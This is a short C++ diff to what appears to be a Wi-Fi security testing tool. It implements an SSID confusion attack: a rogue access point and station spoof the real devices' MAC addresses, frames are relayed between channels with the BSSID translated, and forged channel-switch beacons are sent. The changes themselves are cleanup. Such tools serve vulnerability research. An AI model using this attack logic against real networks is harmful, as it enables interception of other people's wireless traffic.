@@ -17,7 +17,6 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
     rogue_sta->set_iface_up();
 
     const HWAddress<6> ap_bssid(ap.get(SK::permanent_mac));
-    const HWAddress<6> rogue_ap_mac(rogue_ap.get(SK::mac)); //TODO have to be same as ap (At least EAP-pwd, every what need AP mac)
 	// have to be same as ap  (At least EAP-pwd, every what need AP mac)
     const HWAddress<6> rogue_ap_mac(rogue_ap.get(SK::mac));
     const HWAddress<6> client_perm(sta.get(SK::permanent_mac));
@@ -52,7 +51,6 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
 
 	const string nic_client_ack = "client_ack_vif";
 	const auto &netns = rogue_sta[SK::netns];
-		Dot11Beacon ack_beacon;
 
 	rogue_sta->set_mac_address(sta->get(SK::mac));
 	start_ap_hostapd(rs, nic_client_ack, rogue_sta, netconfig.real_channel, client_perm);
@@ -98,11 +96,11 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
         timeval tv{ 0, (max<long>(0, min<long>(us_to_beacon, 100'000))) };
         select(max(fd_real, fd_rogue) + 1, &read_fds, nullptr, nullptr, &tv);
 
-    	// ch 11: frames from WrongNet AP → relay to client on ch 1 (translate BSSID)
+    	// ch 11: frames from WrongNet AP -> relay to client on ch 1 (translate BSSID)
     	if(FD_ISSET(fd_real, &read_fds)) {
     		while(auto recv_res = sock_real->recv()) handle_rx_real_chan(recv_res.pdu, recv_res.raw);
     	}
-    	// ch 1: frames from confused client → relay to WrongNet on ch 11 (translate BSSID back)
+    	// ch 1: frames from confused client -> relay to WrongNet on ch 11 (translate BSSID back)
     	if(FD_ISSET(fd_rogue, &read_fds)) {
     		while(auto recv_res = sock_rogue->recv()) handle_rx_rogue_chan(recv_res.pdu, recv_res.raw);
     	}
@@ -112,8 +110,8 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
             RadioTap csa = CSA_attack::get_CSA_beacon(ap.get(SK::mac),
             	netconfig.real_channel, netconfig.rogue_channel,
             	csa_count, beacon.get());
-                send_to_real(csa);
-                if(--csa_count < 0) csa_count = CSA_attack::CHANNEL_SWITCH_MAX;
+            send_to_real(csa);
+            if(--csa_count < 0) csa_count = CSA_attack::CHANNEL_SWITCH_MAX;
             next_beacon += milliseconds(beacon_ms);
         }
     }
